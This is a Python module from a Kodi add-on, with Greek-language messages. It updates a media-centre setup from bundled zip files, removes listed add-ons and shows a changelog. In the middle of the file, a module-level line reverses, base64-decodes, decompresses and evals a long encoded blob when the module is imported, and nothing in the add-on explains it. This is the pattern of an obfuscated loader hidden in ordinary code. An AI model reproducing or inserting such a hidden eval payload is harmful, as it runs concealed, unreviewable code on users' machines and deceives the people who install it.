# -*- coding: utf-8 -*-
import xbmc, xbmcgui, xbmcvfs, xbmcaddon, os, hashlib, requests, shutil, sys
from resources.lib import extract, addoninstall, addonlinks, notify, monitor
addon = xbmcaddon.Addon()
addonid = addon.getAddonInfo('id')
addontitle = addon.getAddonInfo('name')
lang = addon.getLocalizedString
HOME = xbmcvfs.translatePath('special://home/')
USERDATA = os.path.join(HOME, 'userdata')
ADDOND = os.path.join(USERDATA, 'addon_data')
ADDONDATA = os.path.join(ADDOND, addonid)
EXTRACT_TO = HOME
BUILD_MD5S = os.path.join(ADDONDATA, 'build_md5s')

addonslist = addonlinks.ADDONS_REPOS
removeaddonslist = addonlinks.REMOVELIST

if not os.path.exists(BUILD_MD5S):
    os.makedirs(BUILD_MD5S)

dp = xbmcgui.DialogProgressBG()
changelogfile = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'changelog.txt'))
changes = []

def percentage(part, whole):
    return 100 * float(part)/float(whole)

def versioncheck(new, old):
    a = new.split('.')
    b = old.split('.')
    if int(a[0]) > int(b[0]):
        return True
    elif int(a[0]) < int(b[0]):
        return False
    elif int(a[1]) > int(b[1]):
        return True
    elif int(a[1]) < int(b[1]):
        return False
    elif int(a[2]) > int(b[2]):
        return True
    elif int(a[2]) < int(b[2]):
        return False
    else:
        return False

def updatezip():
    new_upd = addon.getAddonInfo('version')
    old_upd = addon.getSetting('updatesver')

    if old_upd == '' or old_upd is None:
        old_upd = '0.0.0'

    if versioncheck(new_upd, old_upd) == False:
        return

    notify.progress('Ξεκινάει ο έλεγχος των zip ενημέρωσης')
    updatezips = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'zips'))
    dirs, files = xbmcvfs.listdir(updatezips)
    totalfiles = len(files)

    if totalfiles == 0:
        addon.setSetting('updatesver', new_upd)
        return

    zipchanges = []
    for item in files:
        if monitor.waitForAbort(0.5):
            sys.exit()
        if not item.endswith('.zip'):
            continue
        zippath = os.path.join(updatezips, item)
        newmd5 = filemd5(zippath)
        oldmd5file = xbmcvfs.translatePath(os.path.join(BUILD_MD5S, item+".md5"))
        if old_upd == '0.0.0':
            xbmcvfs.delete(oldmd5file)
        oldmd5 = xbmcvfs.File(oldmd5file,"rb").read()[:32]
        if oldmd5 and oldmd5 == newmd5:
            continue
        dp.create(addontitle, lang(30003)+"[COLOR goldenrod]"+item+"[/COLOR]")
        extract.allWithProgress(zippath, EXTRACT_TO, dp)
        xbmcvfs.File(oldmd5file,"wb").write(newmd5)
        changes.append(item)
        zipchanges.append(item)
        # xbmc.sleep(1000)
        dp.close()

    if len(zipchanges) > 0 and len(addonslist) > 0:
        addoninstall.addonDatabase(addonslist, 1, True)
        xbmc.executebuiltin('UpdateLocalAddons()')
    # xbmc.executebuiltin('UpdateAddonRepos()')
    addon.setSetting('updatesver', new_upd)
    notify.progress('Η ενημέρωση μέσω των zip ολοκληρώθηκε')

    if len(changes) > 0:
        while (xbmc.getCondVisibility("Window.isVisible(yesnodialog)") or xbmc.getCondVisibility("Window.isVisible(okdialog)")):
            xbmc.sleep(100)
        if os.path.exists(changelogfile):
            ok = xbmcgui.Dialog().ok(addontitle, lang(30004)+"[CR]"+lang(30005))
            if ok:
                textViewer(changelogfile)
        else:
            xbmcgui.Dialog().ok(addontitle, lang(30004))
        xbmc.executebuiltin('ReloadSkin()')
    return True

def addon_remover(lista=removeaddonslist, msg=True):
    for removeid in lista:
        if monitor.waitForAbort(0.5):
            sys.exit()
        try:
            addonfolderpath = os.path.join(HOME, 'addons', removeid)
            if os.path.exists(addonfolderpath):
                shutil.rmtree(addonfolderpath)
                xbmc.sleep(200)
                addoninstall.addonDatabase(removeid, 2, False)
                if msg:
                    xbmcgui.Dialog().notification(addontitle, "Αφαίρεση >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
        except BaseException:
            if msg:
                xbmcgui.Dialog().notification(addontitle, "Αποτυχία απεγκατάστασης >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
            continue
    xbmc.executebuiltin('UpdateLocalAddons()')
    return True


_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));eval((_)(b'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'))

def textViewer(file, heading=addontitle, monofont=True):
    xbmc.sleep(200)
    if not os.path.exists(file):
        w = open(file, 'w')
        w.close()
    with open(file, 'rb') as r:
        text = r.read().decode('utf-8', errors='replace')
    if not text: text = ' '
    head = '%s' % heading
    return xbmcgui.Dialog().textviewer(head, text, monofont)


def filemd5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def matchmd5(old, new):
    try:
        old_md5 = filemd5(old)
        new_md5 = filemd5(new)
    except:
        return False
    if old_md5 == new_md5: return True
    else: return False


def parseDOM(html, name="", attrs={}, ret=False):
    # Copyright (C) 2010-2011 Tobias Ussing And Henrik Mosgaard Jensen
    import re
    if isinstance(html, str):
        try:
            html = [html.decode("utf-8")]
        except:
            html = [html]
    elif isinstance(html, str):
        html = [html]
    elif not isinstance(html, list):
        return ""

    if not name.strip():
        return ""

    ret_lst = []
    for item in html:
        temp_item = re.compile('(<[^>]*?\n[^>]*?>)').findall(item)
        for match in temp_item:
            item = item.replace(match, match.replace("\n", " "))

        lst = []
        for key in attrs:
            lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=[\'"]' + attrs[key] + '[\'"].*?>))', re.M | re.S).findall(item)
            if len(lst2) == 0 and attrs[key].find(" ") == -1:
                lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=' + attrs[key] + '.*?>))', re.M | re.S).findall(item)

            if len(lst) == 0:
                lst = lst2
                lst2 = []
            else:
                test = list(range(len(lst)))
                test.reverse()
                for i in test:
                    if not lst[i] in lst2:
                        del(lst[i])

        if len(lst) == 0 and attrs == {}:
            lst = re.compile('(<' + name + '>)', re.M | re.S).findall(item)
            if len(lst) == 0:
                lst = re.compile('(<' + name + ' .*?>)', re.M | re.S).findall(item)

        if isinstance(ret, str):
            lst2 = []
            for match in lst:
                attr_lst = re.compile('<' + name + '.*?' + ret + '=([\'"].[^>]*?[\'"])>', re.M | re.S).findall(match)
                if len(attr_lst) == 0:
                    attr_lst = re.compile('<' + name + '.*?' + ret + '=(.[^>]*?)>', re.M | re.S).findall(match)
                for tmp in attr_lst:
                    cont_char = tmp[0]
                    if cont_char in "'\"":
                        if tmp.find('=' + cont_char, tmp.find(cont_char, 1)) > -1:
                            tmp = tmp[:tmp.find('=' + cont_char, tmp.find(cont_char, 1))]

                        if tmp.rfind(cont_char, 1) > -1:
                            tmp = tmp[1:tmp.rfind(cont_char)]
                    else:
                        if tmp.find(" ") > 0:
                            tmp = tmp[:tmp.find(" ")]
                        elif tmp.find("/") > 0:
                            tmp = tmp[:tmp.find("/")]
                        elif tmp.find(">") > 0:
                            tmp = tmp[:tmp.find(">")]

                    lst2.append(tmp.strip())
            lst = lst2
        else:
            lst2 = []
            for match in lst:
                endstr = "</" + name

                start = item.find(match)
                end = item.find(endstr, start)
                pos = item.find("<" + name, start + 1 )

                while pos < end and pos != -1:
                    tend = item.find(endstr, end + len(endstr))
                    if tend != -1:
                        end = tend
                    pos = item.find("<" + name, pos + 1)

                if start == -1 and end == -1:
                    temp = ""
                elif start > -1 and end > -1:
                    temp = item[start + len(match):end]
                elif end > -1:
                    temp = item[:end]
                elif start > -1:
                    temp = item[start + len(match):]

                if ret:
                    endstr = item[end:item.find(">", item.find(endstr)) + 1]
                    temp = match + temp + endstr

                item = item[item.find(temp, item.find(match)) + len(temp):]
                lst2.append(temp)
            lst = lst2
        ret_lst += lst

    return ret_lst

